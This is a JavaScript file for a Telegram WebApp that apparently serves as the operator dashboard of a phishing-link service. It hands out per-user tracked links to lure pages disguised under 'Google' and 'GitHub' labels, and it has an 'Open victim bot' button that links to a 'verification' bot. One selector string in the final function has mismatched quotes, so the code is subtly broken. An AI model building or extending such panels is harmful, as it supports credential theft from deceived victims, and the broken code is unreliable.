// main.js

// Load Telegram WebApp object
const tg = window.Telegram?.WebApp || null;

// If not inside Telegram, block everything
if (!tg || !tg.initDataUnsafe?.user) {
  document.body.innerHTML = `
    <div style="font-family:sans-serif;text-align:center;margin-top:50px;">
      <h2>❌ This page only works inside Telegram</h2>
      <p>Please open this link from the Telegram app.</p>
    </div>
  `;
  throw new Error("Not in Telegram WebApp");
}

tg.ready(); // Tell Telegram we're ready

document.addEventListener("DOMContentLoaded", () => {
  const u = tg.initDataUnsafe.user;
  const userId = u.id;

  // Free links
  const freeLinksData = [
    { title: "Google", url: "https://rrloaty.github.io/a/face.html?id=" + userId, thumb: "https://www.google.com/favicon.ico" },
    { title: "GitHub", url: "https://rrloaty.github.io/a/inst.html?id=" + userId, thumb: "https://github.githubassets.com/favicons/favicon.svg" }
  ];

  // Show user name / handle
  document.getElementById("user-name").textContent =
    u.first_name + (u.last_name ? " " + u.last_name : "");
  document.getElementById("user-handle").textContent =
    u.username ? "@" + u.username : "";

  // Render free links
  const freeContainer = document.getElementById("free-links");
  freeLinksData.forEach(link => {
    freeContainer.appendChild(createLinkItem(link, true, userId));
  });

  // Tabs & bottom nav
  document.querySelectorAll('.tab-btn, .nav-item').forEach(btn => {
    btn.addEventListener('click', () => switchSection(btn.dataset.target));
  });

  // Copy ID
  document.getElementById("copy-id-btn").addEventListener("click", () => {
    navigator.clipboard.writeText(String(userId))
      .then(() => alert("Telegram ID copied!"));
  });

  // Refresh
  document.getElementById("refresh-btn").addEventListener("click", () => location.reload());

  // Open victim bot
  document.getElementById("open-victim-bot").addEventListener("click", () => {
    const url = `https://t.me/intelligentverificationlinkbot?start=${userId}`;
    tg.openLink(url);
  });
});

function switchSection(sectionId) {
  document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
  document.getElementById(sectionId).classList.add("active");
  document.querySelectorAll(".tab-btn, .nav-item').forEach(b =>
    b.classList.toggle("active", b.dataset.target === sectionId)
  );
}